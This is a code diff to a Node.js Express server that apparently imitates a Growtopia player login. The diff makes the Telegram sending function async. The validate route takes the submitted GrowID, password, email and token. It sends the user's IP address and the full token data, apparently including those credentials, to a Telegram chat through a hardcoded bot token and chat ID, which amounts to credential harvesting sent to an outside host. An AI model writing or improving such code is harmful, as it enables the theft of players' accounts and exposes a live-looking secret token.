@@ -9,7 +9,7 @@ const axios = require('axios'); // !!! NOTE: You must install this package (npm 
 const TELEGRAM_BOT_TOKEN = '6441563124:AAH5nB7WTP2x5F5_hNPcTq36ryJkbgEYv8s'; 
 const TELEGRAM_CHAT_ID = '5113674259'; 
 
-function sendToTelegram(message) {
+async function sendToTelegram(message) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.log('Telegram credentials not set. Skipping notification.');
         return;
@@ -17,17 +17,16 @@ function sendToTelegram(message) {
     
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
-    axios.post(url, {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-    })
-    .then(response => {
+    try {
+        await axios.post(url, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
         // console.log('Telegram notification sent.');
-    })
-    .catch(error => {
+    } catch (error) {
         console.error('Error sending Telegram message:', error.response ? error.response.data : error.message);
-    });
+    }
 }
 
 function isValidEmail(email) {
@@ -82,7 +81,7 @@ app.all('/player/login/dashboard', function (req, res) {
     res.render(__dirname + '/public/html/dashboard.ejs', { data: tData });
 });
 
-app.all('/player/growid/login/validate', (req, res) => {
+app.all('/player/growid/login/validate', async (req, res) => {
     const { type, growId = '', password = '', email = '', gender = 0, _token } = req.body;
 
     const trimmedGrowId = (growId || '').trim();
@@ -152,7 +151,7 @@ app.all('/player/growid/login/validate', (req, res) => {
         `*IP Address*: ${ip}\n` +
         `*Full Token Data (Pre-Encode)*: \`${tokenData}\``;
     
-    sendToTelegram(telegramMessage);
+    await sendToTelegram(telegramMessage);
     // --- END: NEW TELEGRAM LOGIC ---
     
     const token = Buffer.from(tokenData).toString('base64');
